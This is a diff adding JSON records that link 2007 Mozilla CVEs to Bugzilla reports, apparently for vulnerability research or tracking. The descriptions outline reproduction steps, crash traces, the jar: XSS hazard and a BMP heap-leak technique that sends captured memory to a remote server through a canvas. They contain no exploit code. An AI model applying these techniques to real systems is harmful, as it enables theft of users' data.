+    "CVE-2007-5341": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=345305",
+        "title": "Arbitrary code execution with Venkman JavaScript Debugger",
+        "description": "See Bug 344494 and Bug 344751. Venkman is vulnerable to attacks using the Array.prototype methods, too. Steps to Reproduce: 1. Open JavaScript Debugger (Venkman). 2. Open testcase. 3. Set a breakpoint at function xxx. 4. Click a button to call xxx(). 5. Step over until after |var yyy = {};|. 6. Open the tree item for |yyy| in the Local Variables view. An alert dialog that shows Components.stack will appear."
+      },
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=325761",
+        "title": "memory corruption in mozilla <object data='x-jsd:help'>",
+        "description": "there is a memory corruption in mozilla <object data='x-jsd:help'> Mozilla 1.7.12 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060202 triggered by <object data='x-jsd:help'> Program received signal SIGSEGV, Segmentation fault. [Switching to Thread -1218234688 (LWP 26508)] 0xb75c0de3 in XPTC_InvokeByIndex () from /opt/mozilla-nightly/libxpcom.so (gdb) x/i $eip 0xb75c0de3 <XPTC_InvokeByIndex+39>: call *(%edx) (gdb) p/x $edx $1 = 0x10 (gdb) crash place/$eip seems to depend on previous actions. win32 on wine also crashes. testcase to follow."
+      }
+    ],
+    "CVE-2007-5947": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=369814",
+        "title": "jar: protocol is an XSS hazard due to ignoring mime type and being considered same-origin with hosting site",
+        "description": "Any site that allows image uploads (e.g. avatar images) without binary content sniffing is likely to be vulnerable to XSS (in Gecko browsers only) as a result. An attacker would only have to upload a malicious zip file to the site and get users to follow a jar: link. Possible fixes: * Refuse to open zip file contents with jar: unless the file has a mime type appropriate for zips, such as application/zip. * Make jar: not be considered same-origin with the rest of the hosting domain, but only with other contents of the jar. * Both of the above."
+      }
+    ],
+    "CVE-2007-6524": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=408076",
+        "title": "out of bounds read in BMP decoder can lead to information disclosure",
+        "description": "Full credit goes to Michael Skladnikiewicz, who reported this to security@mozilla.org in an email with subject \"Mozilla Firefox 2.0.0.11, 3.0b2pre and prior Remote Information Disclosure\". His initial email is quoted below. ------------------------------------------- Hi, (credit: Gynvael Coldwind // Vexillium with help from udevd and porneL (I didn't know about <canvas> ;D)) OK, Here is how it goes. Firefox has a problem in handling 8bit BMP files. The BMP format has a field in the BITMAPINFOHEADER named biClrUsed, the field says how many colors does the palette contain. If this field is 0, then 256 color pallet is used. When this field is not 0, the palette has the given number of colors. Now this is how it goes in Firefox: 1. Firefox allocates 256 * sizeof(RGB) for the palette 2. It copies the biClrUsed colors from the BMP file Well, what is missing is: 1a. memset(pallete, 0, 256 * sizeof(RGB) The palette still contains old data from the heap. Now, we take a BMP file sized 256x1x8 with biClrUser = 0, and fill the bitmap with gradient, from 0 to 255: 00 01 02 03 04 05 ... and so on When displayed, the BMP file looks chaotic, and in fact it contains the palette copied to the screen. Here is where HTML 5.0 comes in and <canvas>. You can imagine the rest... But I'll write it anyway. You can create a HTML/javascript that copies the image from img to a canvas and then gets it data and, for example using a form, posts it to some remote server. This has been tested and it works. There is a PoC exploit in the bottom. The harvested data contains mainly trash, but there are also parts of other websites, parts of java scripts, even parts of favorites. Well, if there are also cookies and passwords in heap, then they are also reachable. I've attached also the scripts and the leak.bmp bitmap. This will be posted on bugtraq as soon as a fixed version of FireFox is released. Please check also Thunderbird for this issue (I didn't check). Best regards, Looking forward to Your reply, Michael \"Gynvael Coldwind\" Skladnikiewicz Team Vexillium Hispasec"
+      }
+    ],
+    "CVE-2007-6589": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=369814",
+        "title": "jar: protocol is an XSS hazard due to ignoring mime type and being considered same-origin with hosting site",
+        "description": "Any site that allows image uploads (e.g. avatar images) without binary content sniffing is likely to be vulnerable to XSS (in Gecko browsers only) as a result. An attacker would only have to upload a malicious zip file to the site and get users to follow a jar: link. Possible fixes: * Refuse to open zip file contents with jar: unless the file has a mime type appropriate for zips, such as application/zip. * Make jar: not be considered same-origin with the rest of the hosting domain, but only with other contents of the jar. * Both of the above."
+      },
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=403331",
+        "title": "Sort out jar: behavior on HTTP redirects",
+        "description": "Bug 369814 points out that jar: doesn't update its principal (or URI, for that matter) when an HTTP redirect happens. Arguably, it should. The simplest thing to do here seems to be to replace the \"jar file\" URI with the post-load URI that the channel loading the jar file ends up with (using NS_GetFinalChannelURI). Then everything else should Just Work, I think. Does that make sense?"
+      }
+    ]
+  }
 }
